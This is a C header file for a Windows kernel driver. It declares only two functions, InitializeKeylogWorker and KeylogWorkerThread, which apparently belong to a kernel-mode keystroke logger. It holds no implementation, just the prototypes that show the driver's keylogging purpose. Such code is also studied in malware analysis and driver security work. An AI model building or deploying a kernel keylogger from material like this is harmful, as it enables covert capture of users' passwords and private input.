#pragma once

#include <ntddk.h>

NTSTATUS 
InitializeKeylogWorker(
		IN PDEVICE_OBJECT DeviceObject
		);

VOID 
KeylogWorkerThread(
		IN PKEYLOG_DEVICE_EXTENSION KeylogExtension
		);

